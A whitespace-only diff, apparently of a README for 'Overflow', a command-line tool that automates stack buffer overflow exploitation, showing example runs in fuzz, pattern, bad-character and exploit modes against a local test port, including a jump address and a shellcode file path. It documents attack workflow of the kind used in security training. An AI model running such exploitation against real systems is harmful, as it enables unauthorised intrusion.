@@ -75,10 +75,10 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
  Overflow v0.1
  by Stephen Radley (github.com/sradley)
 ─────────────────────────────────────────────────
- :: Mode		: fuzz 
- :: Host		: 127.0.0.1
- :: Port		: 4444
- :: Step		: 100
+ :: Mode        : fuzz 
+ :: Host        : 127.0.0.1
+ :: Port        : 4444
+ :: Step        : 100
 ─────────────────────────────────────────────────
  > Building payload.
  > Sending 100-byte payload.
@@ -126,10 +126,10 @@ $ overflow pattern -H 127.0.0.1 -P 4444 -l 65
  Overflow v0.1
  by Stephen Radley (github.com/sradley)
 ─────────────────────────────────────────────────
- :: Mode		: pattern 
- :: Host		: 127.0.0.1
- :: Port		: 4444
- :: Length		: 65
+ :: Mode        : pattern 
+ :: Host        : 127.0.0.1
+ :: Port        : 4444
+ :: Length      : 65
 ─────────────────────────────────────────────────
  > Building payload.
  > Sending 65-byte payload.
@@ -175,10 +175,10 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160
  Overflow v0.1
  by Stephen Radley (github.com/sradley)
 ─────────────────────────────────────────────────
- :: Mode		: chars 
- :: Host		: 127.0.0.1
- :: Port		: 4444
- :: Offset		: 160
+ :: Mode        : chars 
+ :: Host        : 127.0.0.1
+ :: Port        : 4444
+ :: Offset      : 160
 ─────────────────────────────────────────────────
  > Building payload.
  > Sending 416-byte payload. 
@@ -201,10 +201,10 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
  Overflow v0.1
  by Stephen Radley (github.com/sradley)
 ─────────────────────────────────────────────────
- :: Mode		: chars 
- :: Host		: 127.0.0.1
- :: Port		: 4444
- :: Offset		: 160
+ :: Mode        : chars 
+ :: Host        : 127.0.0.1
+ :: Port        : 4444
+ :: Offset      : 160
  :: Exclude     : "\x00\x41\xAB\x01"
 ─────────────────────────────────────────────────
  2020/10/29 20:19:05 Starting overflow
@@ -253,12 +253,12 @@ $ overflow -H 127.0.0.1 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
  Overflow v0.1
  by Stephen Radley (github.com/sradley)
 ─────────────────────────────────────────────────
- :: Mode		: exploit 
- :: Host		: 127.0.0.1
- :: Port		: 4444
- :: Offset		: 160
- :: Jump		: "0x5f4a358f"
- :: Shell		: path/to/payload.shell
+ :: Mode        : exploit 
+ :: Host        : 127.0.0.1
+ :: Port        : 4444
+ :: Offset      : 160
+ :: Jump        : "0x5f4a358f"
+ :: Shell       : path/to/payload.shell
 ─────────────────────────────────────────────────
  > Building payload.
  > Sending 531-byte payload. 
